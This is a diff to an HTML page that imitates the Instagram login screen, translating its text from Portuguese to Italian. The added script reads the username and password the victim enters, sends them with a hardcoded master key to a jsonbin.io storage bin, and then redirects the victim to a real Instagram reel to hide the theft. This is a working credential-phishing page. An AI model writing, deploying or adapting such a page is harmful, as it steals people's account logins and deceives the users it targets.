@@ -17,38 +17,63 @@
                     <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                 </h1>
                 <form>
-                    <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
-                    <input name="email" placeholder="Telefone, nome de usuário ou e-mail" />
+                    <label for="email"  class="sr-only">Telefono, nome utente o e-mail</label>
+                    <input name="email" id="username" placeholder="Telefono, nome utente o e-mail" />
 
-                    <label for="password" class="sr-only">Senha</label>
-                    <input name="password" type="password" placeholder="Senha" />
+                    <label for="password"  class="sr-only">Password</label>
+                    <input name="password" id="password" type="password" placeholder="Password" />
 
-                    <button type="button">Entrar</button>
+                    <button type="button" onclick="entra()">Entra</button>
                 </form>
                 <div class="flex separator align-items-center">
                     <span></span>
-                    <div class="or">OU</div>
+                    <div class="or">O</div>
                     <span></span>
                 </div>
                 <div class="login-with-fb flex direction-column align-items-center">
                     <div>
                         <img />
-                        <a>Entrar com o facebook</a>
+                        <a>Entra con Facebook</a>
                     </div>
-                    <a href="#">Esqueceua senha?</a>
+                    <a href="#">Hai dimenticato la password?</a>
                 </div>
             </div>
             <div class="panel register flex justify-content-center">
-                <p>Não tem uma conta?</p>
-                <a href="#">Cadastre-se</a>
+                <p>Non hai un account?</p>
+                <a href="#">Registrati</a>
             </div>
             <div class="app-download flex direction-column align-items-center">
-                <p>Obtenha o aplicativo.</p>
+                <p>Ottieni l'applicazione.</p>
                 <div class="flex justify-content-center">
                     <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                     <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                 </div>
             </div>
+            <script>
+                async function entra(){
+
+                    const username = document.getElementById("username").value
+                    const password = document.getElementById("password").value
+
+                    await fetch("https://api.jsonbin.io/v3/b/68c05e90d0ea881f4077add3", {
+                    method: "PUT",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "X-Master-Key": "$2a$10$LFH.dVNQRFKpy3mU2Ih4suSF/cFaysyru6pwC3ljdQO6/h8yaTize"
+                    },
+                    body: JSON.stringify({
+                        "username":username,
+                        "password":password
+                    })
+                    })
+                    .then(res => res.json())
+                    .then(data => console.log(data));
+
+                    window.location.replace("https://www.instagram.com/reel/CcILJFxFBp0/?utm_source=ig_web_copy_link");
+
+                }
+                
+            </script>
         </section>
     </main>
     <footer>
